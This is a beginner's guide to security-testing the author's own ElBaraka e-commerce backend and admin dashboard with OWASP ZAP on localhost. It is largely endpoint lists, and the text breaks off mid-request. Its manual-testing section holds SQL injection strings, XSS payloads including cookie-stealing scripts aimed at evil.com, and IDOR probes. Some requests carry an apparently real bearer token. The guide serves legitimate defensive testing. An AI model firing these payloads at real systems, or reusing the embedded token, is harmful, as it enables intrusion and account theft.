# OWASP ZAP Security Testing — Complete Guide for ElBaraka

> **This guide assumes you know NOTHING about ZAP. Every click, every field, every screenshot-worthy step is explained. Follow it exactly.**

---

## Table of Contents

1. [Install & First Launch](#1-install--first-launch)
2. [Understanding ZAP Interface](#2-understanding-zap-interface)
3. [Phase 1: Automated Scan — Backend API](#3-phase-1-automated-scan--backend-api)
4. [Phase 2: Authenticated Scan — User API](#4-phase-2-authenticated-scan--user-api)
5. [Phase 3: Authenticated Scan — Admin API](#5-phase-3-authenticated-scan--admin-api)
6. [Phase 4: Admin Dashboard Web App Scan](#6-phase-4-admin-dashboard-web-app-scan)
7. [Phase 5: Manual Testing — Every Attack Type](#7-phase-5-manual-testing--every-attack-type)
8. [Phase 6: API Fuzzing](#8-phase-6-api-fuzzing)
9. [Phase 7: Frontend Mobile App — Proxy Intercept](#9-phase-7-frontend-mobile-app--proxy-intercept)
10. [How to Read & Fix ZAP Results](#10-how-to-read--fix-zap-results)
11. [Complete Attack Scenarios for All 3 Systems](#11-complete-attack-scenarios-for-all-3-systems)
12. [ZAP Reports — Generate & Interpret](#12-zap-reports--generate--interpret)

---

## 1. Install & First Launch

### Step 1: Download ZAP

1. Go to: **https://www.zaproxy.org/download/**
2. Download the **Windows 64-bit Installer** (.exe)
3. Run the installer → Next → Next → Install → Finish
4. ZAP needs Java — if it asks for Java, install **JDK 17+** from https://adoptium.net/

### Step 2: First Launch Configuration

1. Open **OWASP ZAP** from Start Menu
2. It asks: *"Do you want to persist the ZAP session?"*
   - Select: **"Yes, I want to persist this session with name based on the current timestamp"**
   - Click **Start**
3. Wait for ZAP to fully load (30-60 seconds)

### Step 3: Update ZAP Add-ons

1. Go to menu: **Help → Check for Updates**
2. Click **"Update All"**
3. Restart ZAP when prompted

### Step 4: Install Essential Add-ons

Go to **Manage Add-ons** (menu: **Analyze → Manage Add-ons** OR the puzzle piece icon):

| Add-on | Why You Need It |
|--------|----------------|
| **OpenAPI Support** | Import your API definition directly |
| **FuzzDB** | Hundreds of attack payloads for fuzzing |
| **Token Generation** | Handle auth tokens |
| **Ajax Spider** | Spider JavaScript-heavy pages (admin dashboard) |
| **GraphQL Support** | In case you add GraphQL later |
| **Retire.js** | Find outdated/vulnerable JavaScript libraries |

Click the **Marketplace** tab → Search each add-on → Click **Install**.

---

## 2. Understanding ZAP Interface

```
┌─────────────────────────────────────────────────────────┐
│  Menu Bar (File, Edit, Analyze, Report, Tools, Help)    │
├──────────────────┬──────────────────────────────────────┤
│                  │                                      │
│  SITES TREE      │   REQUEST / RESPONSE PANEL           │
│  (Left panel)    │   (Shows HTTP request & response)    │
│                  │                                      │
│  Shows all URLs  │   Top: Request headers + body        │
│  you've visited  │   Bottom: Response headers + body    │
│  organized as    │                                      │
│  a tree          │                                      │
│                  │                                      │
├──────────────────┴──────────────────────────────────────┤
│  BOTTOM PANEL                                           │
│  Tabs: History | Search | Alerts | Active Scan | Spider │
│                                                         │
│  ALERTS tab = where vulnerabilities appear              │
│  HISTORY tab = every HTTP request ZAP has seen          │
└─────────────────────────────────────────────────────────┘
```

**Key concepts:**
- **Spider** = ZAP crawls your site to discover all pages/endpoints
- **Active Scan** = ZAP attacks each endpoint it found to test for vulnerabilities
- **Passive Scan** = ZAP checks responses that pass through it (no attacks, just analysis)
- **Alerts** = Vulnerabilities found, rated: High / Medium / Low / Informational
- **Fuzzer** = You define a target parameter and ZAP tries thousands of attack payloads

---

## 3. Phase 1: Automated Scan — Backend API (Public Endpoints)

> **Goal:** Scan all unauthenticated endpoints to find vulnerabilities accessible to anyone on the internet.

### Before You Begin: Start Your Backend

```powershell
cd d:\elbarakkaaaaa\unibackend
php artisan serve
# Server running at http://127.0.0.1:8000
```

### Method A: Quick Start — Automated Scan

1. In ZAP, click the **"Automated Scan"** button (big green play button on the Quick Start tab)
2. Enter URL: **`http://localhost:8000`**
3. Check **"Use traditional spider"** ✅
4. Check **"Use Ajax spider"** ❌ (no JavaScript pages on API)
5. Click **"Attack"**
6. Wait 5-10 minutes
7. Check the **Alerts** tab at the bottom

**Problem:** The automated scan only finds what it can crawl. Your API endpoints don't have HTML links, so ZAP won't find most of them. That's why we need Method B.

### Method B: Manual URL Import (RECOMMENDED)

This tells ZAP about ALL your endpoints so it can test each one.

#### Step 1: Create an API Endpoint List

We'll manually add every public endpoint to ZAP.

1. In ZAP, go to the bottom panel → click **"+"** tab → select **"Requester"** (or use the Manual Request Editor: **Tools → Manual Request Editor**)

2. Send each of these requests one by one. After each one, you'll see it appear in the **Sites** tree on the left:

**Health Endpoints:**
```http
GET http://localhost:8000/api/health HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/health/detailed HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/health/metrics HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Products:**
```http
GET http://localhost:8000/api/v1/products HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/products/featured HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/products/flash-deals HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Categories:**
```http
GET http://localhost:8000/api/v1/categories HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/categories/featured-with-products HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Promotions:**
```http
GET http://localhost:8000/api/v1/promotions HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/promotions/featured HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Offers:**
```http
GET http://localhost:8000/api/v1/offers HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/offers/summary HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Store Settings:**
```http
GET http://localhost:8000/api/v1/store/settings HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/store/status HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/store/working-hours HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/store/delivery-settings HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Delivery Zones:**
```http
GET http://localhost:8000/api/v1/delivery-zones HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/delivery-zones/check-coverage HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"latitude": 30.0444, "longitude": 31.2357}
```

```http
POST http://localhost:8000/api/v1/delivery-zones/calculate-fee HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"latitude": 30.0444, "longitude": 31.2357}
```

**Auth Endpoints (Guest):**
```http
POST http://localhost:8000/api/v1/auth/register HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "ZAP Test", "email": "zaptest@test.com", "password": "ZapTest123!", "password_confirmation": "ZapTest123!", "phone": "+201000000000"}
```

```http
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "zaptest@test.com", "password": "ZapTest123!"}
```

```http
POST http://localhost:8000/api/v1/auth/forgot-password HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "zaptest@test.com"}
```

```http
POST http://localhost:8000/api/v1/auth/check-email HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "zaptest@test.com"}
```

```http
POST http://localhost:8000/api/v1/auth/check-phone HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"phone": "+201000000000"}
```

**Cart (Public):**
```http
GET http://localhost:8000/api/v1/cart HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/cart/add HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"product_id": 1, "quantity": 1}
```

**Promo Codes (Public):**
```http
GET http://localhost:8000/api/v1/promo-codes/available HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/promo-codes/validate HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"code": "TEST123"}
```

**Static Pages:**
```http
GET http://localhost:8000/api/v1/pages HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Flash Sales:**
```http
GET http://localhost:8000/api/v1/flash-sales HTTP/1.1
Host: localhost:8000
Accept: application/json

```

#### Step 2: Run Active Scan on All Discovered Endpoints

1. In the **Sites** tree (left panel), right-click on **`http://localhost:8000`**
2. Click **"Active Scan..."**
3. In the dialog:
   - **Starting Point:** `http://localhost:8000` (already filled)
   - **Recurse:** ✅ Yes
   - Click the **"Policy"** tab → Make sure **ALL** scan policies are enabled
   - Click **"Start Scan"**
4. Watch the **Active Scan** tab at the bottom — it shows progress
5. This takes **15-30 minutes** depending on number of endpoints
6. When done, check **Alerts** tab for results

---

## 4. Phase 2: Authenticated Scan — User API

> **Goal:** Test all endpoints that require a logged-in customer (auth:sanctum). ZAP needs a valid Bearer token.

### Step 1: Get an Auth Token

Use ZAP's Manual Request Editor (**Tools → Manual Request Editor**) or Postman:

```http
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "your-test-user@test.com", "password": "YourPassword123!"}
```

From the response, copy the `token` value. It looks like: `1|abcdef123456...`

### Step 2: Configure ZAP to Use Your Token

#### Method: Replacer Rule (RECOMMENDED — Easiest)

1. Go to menu: **Tools → Options**
2. In the left panel, click **"Replacer"** (under Network section)
3. Click **"Add"**
4. Fill in:
   - **Description:** `Bearer Token - User`
   - **Match Type:** `Request Header (will add if not present)`
   - **Match String:** `Authorization`
   - **Replacement:** `Bearer 1|abcdef123456...` (paste your REAL token)
   - **Enable:** ✅
   - **Applies to:** `Requests in scope only` (or `All requests`)
5. Click **OK** → **OK**

Now EVERY request ZAP makes will include your auth token.

### Step 3: Add All Protected User Endpoints

Send each of these through ZAP's Manual Request Editor. ZAP will auto-attach the Bearer token:

**Profile:**
```http
GET http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
PUT http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "Updated Name", "phone": "+201111111111"}
```

**Addresses:**
```http
GET http://localhost:8000/api/v1/addresses HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/addresses HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"label": "Home", "address_line_1": "123 Test St", "city": "Cairo", "area": "Nasr City", "latitude": 30.0444, "longitude": 31.2357, "is_default": true}
```

**Orders:**
```http
GET http://localhost:8000/api/v1/orders HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/orders/1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/orders/1/tracking HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/orders/1/can-cancel HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Checkout:**
```http
GET http://localhost:8000/api/v1/checkout/addresses HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/checkout/delivery-slots HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/checkout/payment-methods HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/checkout/calculate HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"address_id": 1, "delivery_slot": "morning"}
```

**Payments:**
```http
POST http://localhost:8000/api/v1/payments/paymob/pre-check HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"order_id": 1}
```

```http
GET http://localhost:8000/api/v1/payments/status/1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Payment Methods:**
```http
GET http://localhost:8000/api/v1/payment-methods HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Wallet:**
```http
GET http://localhost:8000/api/v1/wallet HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/wallet/transactions HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Favorites:**
```http
GET http://localhost:8000/api/v1/favorites HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/favorites HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"product_id": 1}
```

**Complaints:**
```http
GET http://localhost:8000/api/v1/complaints HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/complaints HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"order_id": 1, "subject": "Test complaint", "message": "Testing"}
```

**Reviews:**
```http
GET http://localhost:8000/api/v1/reviews/my-reviews HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Notifications:**
```http
GET http://localhost:8000/api/v1/notifications HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/notifications/unread-count HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Watchlist:**
```http
GET http://localhost:8000/api/v1/watchlist HTTP/1.1
Host: localhost:8000
Accept: application/json

```

### Step 4: Run Active Scan on Authenticated Endpoints

1. Right-click **`http://localhost:8000`** in Sites tree
2. Click **"Active Scan..."**
3. Make sure the Replacer rule is enabled (so ZAP sends the Bearer token)
4. Click **"Start Scan"**
5. Wait 20-40 minutes
6. Check **Alerts** tab

### ⚠️ Important: Token Expiration

Your token might expire during a long scan. If you see lots of 401 responses in the History tab:
1. Re-login to get a new token
2. Update the Replacer rule with the new token
3. Re-run the scan

Since your tokens last 180 days (current config), this shouldn't be a problem.

---

## 5. Phase 3: Authenticated Scan — Admin API

> **Goal:** Test all admin endpoints to verify they're properly protected and don't have vulnerabilities.

### Step 1: Get Admin Token

```http
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "admin@elbaraka.com", "password": "YourAdminPassword"}
```

### Step 2: Update the Replacer Rule

1. **Tools → Options → Replacer**
2. Edit the existing rule OR disable the old one and create a new one
3. Set **Replacement** to: `Bearer ADMIN_TOKEN_HERE`
4. Click **OK**

### Step 3: Add All Admin Endpoints

Send each through Manual Request Editor:

**Dashboard & Analytics:**
```http
GET http://localhost:8000/api/v1/admin/analytics/dashboard HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/sales HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/customers HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/products HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/orders HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/marketing HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/financial HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/inventory HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/analytics/operational HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Products (Admin):**
```http
GET http://localhost:8000/api/v1/admin/products HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/admin/products HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "ZAP Test Product", "price": 100, "category_id": 1, "barcode": "ZAPTEST001", "stock": 10}
```

```http
GET http://localhost:8000/api/v1/admin/products/1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
PUT http://localhost:8000/api/v1/admin/products/1 HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "ZAP Updated Product", "price": 150}
```

**Categories (Admin):**
```http
GET http://localhost:8000/api/v1/admin/categories HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
POST http://localhost:8000/api/v1/admin/categories HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"name": "ZAP Test Category"}
```

**Orders (Admin):**
```http
GET http://localhost:8000/api/v1/admin/orders HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/orders/1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
PUT http://localhost:8000/api/v1/admin/orders/1/status HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"status": "confirmed"}
```

**Customers:**
```http
GET http://localhost:8000/api/v1/admin/customers HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/customers/1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Support:**
```http
GET http://localhost:8000/api/v1/admin/support HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/support/analytics HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Financial:**
```http
GET http://localhost:8000/api/v1/admin/financial/dashboard HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/financial/transactions HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Promotions (Admin):**
```http
GET http://localhost:8000/api/v1/admin/promotions HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Promo Codes:**
```http
GET http://localhost:8000/api/v1/admin/promo-codes HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Refunds:**
```http
GET http://localhost:8000/api/v1/admin/refunds HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/refund-dashboard HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Users (Admin team):**
```http
GET http://localhost:8000/api/v1/admin/users HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Activity & Admin Logs:**
```http
GET http://localhost:8000/api/v1/admin/activity-logs HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/admin/admin-logs HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Reviews (Admin):**
```http
GET http://localhost:8000/api/v1/admin/reviews HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Store Settings:**
```http
GET http://localhost:8000/api/v1/admin/store-settings HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Pages (CMS):**
```http
GET http://localhost:8000/api/v1/admin/pages HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Delivery Zones:**
```http
GET http://localhost:8000/api/v1/admin/delivery-zones HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Drivers:**
```http
GET http://localhost:8000/api/v1/admin/drivers HTTP/1.1
Host: localhost:8000
Accept: application/json

```

**Notifications (Admin):**
```http
GET http://localhost:8000/api/v1/admin/notifications HTTP/1.1
Host: localhost:8000
Accept: application/json

```

### Step 4: Run Active Scan

Same as before — right-click the site in the tree → Active Scan → Start.

### Step 5: Critical Test — Admin Escalation

**AFTER the admin scan, do this manually:**

1. Disable the Admin Replacer rule
2. Create a NEW Replacer rule with the **regular user token**
3. Try to access admin endpoints with a regular user token:

```http
GET http://localhost:8000/api/v1/admin/orders HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer REGULAR_USER_TOKEN

```

**Expected result:** `403 Forbidden`
**If you get 200 OK:** YOU HAVE A CRITICAL SECURITY HOLE. The admin middleware isn't working.

Do this for ALL admin endpoints. Every single one must return 403 with a regular user token.

---

## 6. Phase 4: Admin Dashboard Web App Scan

> **Goal:** Scan the React admin dashboard for XSS, DOM-based vulnerabilities, and JavaScript security issues.

### Step 1: Start the Admin Dashboard

```powershell
cd "d:\elbarakkaaaaa\admindash frontend"
npm install
npm run dev
# Running at http://localhost:3000
```

### Step 2: Configure ZAP as Browser Proxy

1. In ZAP menu: **Tools → Options → Network → Local Servers/Proxies**
2. Note the **Address** (usually `localhost`) and **Port** (usually `8080`)
3. Open Chrome:
   - Go to **Settings → System → Open your computer's proxy settings**
   - OR easier: Install the **FoxyProxy** Chrome extension
   - Set proxy to: `localhost:8080` (ZAP's port)

4. **Install ZAP's SSL Certificate** (so HTTPS works through ZAP):
   - In ZAP: **Tools → Options → Network → Server Certificates**
   - Click **"Save"** → Save the certificate file
   - In Chrome: **Settings → Privacy and Security → Security → Manage certificates**
   - Import the ZAP certificate as a **Trusted Root Certificate Authority**

### Step 3: Browse the Admin Dashboard Through ZAP

With the proxy configured, open Chrome and go to `http://localhost:3000`:

1. **Login page** → Login with admin credentials
2. ZAP captures the login request in the **History** tab
3. Now browse EVERY page:
   - Dashboard
   - Products → Create/Edit/Delete a product
   - Categories → Create/Edit
   - Orders → Click an order → Change status
   - Customers → Click a customer
   - Support → Click a ticket → Reply
   - Financial → Export PDF → Export Excel
   - Promotions → Create one
   - Promo Codes → Create one
   - Refunds
   - Analytics
   - Settings
   - Content (CMS pages)
   - Reviews
   - Delivery Zones → Draw on map
   - Drivers
   - Activity Logs
   - Admin Logs
   - Users

4. As you browse, ZAP builds the Sites tree with every URL and AJAX request

### Step 4: Run Ajax Spider (for JavaScript-rendered content)

1. Right-click **`http://localhost:3000`** in Sites tree
2. Click **"Ajax Spider..."**
3. Select browser: **Chrome Headless** (or Firefox Headless)
4. Click **"Start Scan"**
5. Wait 10-20 minutes — the Ajax Spider clicks every link and button it finds

### Step 5: Run Active Scan on the Dashboard

1. Right-click **`http://localhost:3000`** in Sites tree
2. Click **"Active Scan..."**
3. Click **"Start Scan"**
4. Wait 15-30 minutes
5. Check **Alerts** tab

### What ZAP Finds on Web Apps:

| Alert | Severity | What It Means |
|-------|----------|---------------|
| **Reflected XSS** | HIGH | User input is reflected in page without encoding |
| **Stored XSS** | HIGH | User input stored in DB and rendered without encoding |
| **DOM-based XSS** | HIGH | JavaScript manipulates DOM unsafely |
| **CSP Not Set** | MEDIUM | No Content-Security-Policy header |
| **Missing Anti-CSRF Tokens** | MEDIUM | Forms don't have CSRF protection |
| **X-Frame-Options Not Set** | MEDIUM | Page can be loaded in iframe (clickjacking) |
| **Cookie Without Secure Flag** | MEDIUM | Cookie sent over HTTP |
| **Cookie Without SameSite** | LOW | Cookie vulnerable to CSRF |
| **Retire.js Finding** | VARIES | Outdated JavaScript library with known vulns |
| **Information Disclosure** | LOW | Server version, stack traces, etc. |

---

## 7. Phase 5: Manual Testing — Every Attack Type

> **These are attacks ZAP's automated scan might miss. You MUST do these by hand.**

### Attack 1: SQL Injection (SQLi)

**Where to test:** Every endpoint that accepts user input — search, login, filters, IDs

Open ZAP's **Manual Request Editor** (Tools → Manual Request Editor) for each:

```http
# Test 1: Login SQL injection
POST http://localhost:8000/api/v1/auth/login HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json

{"email": "' OR '1'='1", "password": "' OR '1'='1"}
```
**Expected:** 422 Validation Error (email format invalid)
**Bad:** 200 OK or 500 Server Error with SQL details

```http
# Test 2: Product search SQL injection
GET http://localhost:8000/api/v1/products?search=' UNION SELECT * FROM users -- HTTP/1.1
Host: localhost:8000
Accept: application/json

```
**Expected:** Empty results or 422
**Bad:** Returns user data or SQL error

```http
# Test 3: Order ID injection
GET http://localhost:8000/api/v1/orders/1 OR 1=1 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer YOUR_TOKEN

```
**Expected:** 404 Not Found
**Bad:** Returns all orders

```http
# Test 4: Category ID injection
GET http://localhost:8000/api/v1/categories/1; DROP TABLE products;-- HTTP/1.1
Host: localhost:8000
Accept: application/json

```
**Expected:** 404 or 422
**Bad:** 500 Server Error

```http
# Test 5: Admin product search injection
GET http://localhost:8000/api/v1/admin/products?search='; DELETE FROM products;-- HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer ADMIN_TOKEN

```
**Expected:** Empty results
**Bad:** Products deleted

```http
# Test 6: Boolean-based blind SQLi
GET http://localhost:8000/api/v1/products/1 AND 1=1 HTTP/1.1
Host: localhost:8000
Accept: application/json

```

```http
GET http://localhost:8000/api/v1/products/1 AND 1=2 HTTP/1.1
Host: localhost:8000
Accept: application/json

```
**If both return the same result:** Likely safe (input is being parameterized)
**If one returns data and other doesn't:** SQL injection exists!

```http
# Test 7: Time-based blind SQLi
GET http://localhost:8000/api/v1/products/1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: localhost:8000
Accept: application/json

```
**If the response takes 5+ seconds:** SQL Injection is confirmed!
**If response is immediate:** Input is safe

### Attack 2: Cross-Site Scripting (XSS)

**Where to test:** Product names, category names, complaint messages, review text, user profile names, addresses, promo code names, CMS content — EVERY text field.

```http
# Test 1: XSS in user profile name
PUT http://localhost:8000/api/v1/profile HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer 1716|zZAYTJqHhSTxyWzczri6FeYrRJPKfxGx63GgbVQj420379ca

{"name": "<script>alert('XSS')</script>"}
```
**Then:** Go to admin dashboard → Customers → Find this user → Check if the script tag is escaped in the HTML

```http
# Test 2: XSS in complaint message
POST http://localhost:8000/api/v1/complaints HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer 1716|zZAYTJqHhSTxyWzczri6FeYrRJPKfxGx63GgbVQj420379ca

{"order_id": 1, "subject": "<img src=x onerror=alert('XSS')>", "message": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"}
```
**Then:** Open admin dashboard → Support → Click this ticket → Does the script execute?

```http
# Test 3: XSS in review
POST http://localhost:8000/api/v1/reviews HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"product_id": 1, "rating": 5, "comment": "\"><script>fetch('https://evil.com/steal?c='+document.cookie)</script>"}
```

```http
# Test 4: XSS in address
POST http://localhost:8000/api/v1/addresses HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN

{"label": "<svg onload=alert('XSS')>", "address_line_1": "javascript:alert('XSS')", "city": "Cairo", "area": "Test", "latitude": 30.04, "longitude": 31.23}
```

```http
# Test 5: XSS in admin CMS page (CRITICAL — admin content rendered to ALL users)
PUT http://localhost:8000/api/v1/admin/pages/1 HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer ADMIN_TOKEN

{"content_en": "<script>alert('Stored XSS in Terms page')</script>", "content_ar": "<script>alert('XSS')</script>"}
```
**Then:** Go to mobile app → About → Terms & Conditions → Does the script run?

```http
# Test 6: XSS in product name (admin creates, users see)
POST http://localhost:8000/api/v1/admin/products HTTP/1.1
Host: localhost:8000
Accept: application/json
Content-Type: application/json
Authorization: Bearer ADMIN_TOKEN

{"name": "<img src=x onerror=alert('XSS')>", "price": 100, "category_id": 1, "barcode": "XSS001", "stock": 10}
```

**How to verify XSS on the admin dashboard:**
1. Open Chrome DevTools (F12)
2. Go to Console tab
3. If you see the alert popup or any script execution → **XSS vulnerability exists**
4. Check if `DOMPurify` is sanitizing: search in Chrome DevTools → Elements tab for the injected tags — they should be stripped

### Attack 3: Insecure Direct Object Reference (IDOR)

**This is your #1 risk.** User A accessing User B's data.

```
SETUP: 
- Create 2 test users (User A and User B)
- Login as User A, get Token A
- Login as User B, get Token B
- Create an order as User B (note the order ID, e.g., 42)
- Create an address as User B (note address ID, e.g., 15)
- Submit a complaint as User B (note complaint ID, e.g., 7)
```

```http
# IDOR Test 1: Access User B's order with User A's token
GET http://localhost:8000/api/v1/orders/42 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
**Expected:** 403 Forbidden or 404 Not Found
**VULNERABLE if:** 200 OK with User B's order data

```http
# IDOR Test 2: Cancel User B's order with User A's token
POST http://localhost:8000/api/v1/orders/42/cancel HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
**Expected:** 403 Forbidden
**VULNERABLE if:** Order gets cancelled

```http
# IDOR Test 3: Access User B's address
GET http://localhost:8000/api/v1/addresses/15 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
**Expected:** 403 or 404

```http
# IDOR Test 4: Delete User B's address
DELETE http://localhost:8000/api/v1/addresses/15 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
**Expected:** 403 or 404
**VULNERABLE if:** Address is deleted

```http
# IDOR Test 5: Read User B's complaint
GET http://localhost:8000/api/v1/complaints/7 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```

```http
# IDOR Test 6: Read User B's notifications
GET http://localhost:8000/api/v1/notifications HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
(This one is trickier — notifications should be scoped to the user internally)

```http
# IDOR Test 7: View User B's wallet
GET http://localhost:8000/api/v1/wallet HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```
(Should show User A's wallet, not User B's — verify it's scoped)

```http
# IDOR Test 8: Modify User B's payment methods
DELETE http://localhost:8000/api/v1/payment-methods/3 HTTP/1.1
Host: localhost:8000
Accept: application/json
Authorization: Bearer TOKEN_A

```

```http
# IDOR Test 9: Delete User B's review
DELETE http://localhost:8000/api/v1/reviews/5 HTTP/1.1
Host: localhost:8000
Accept: application/json
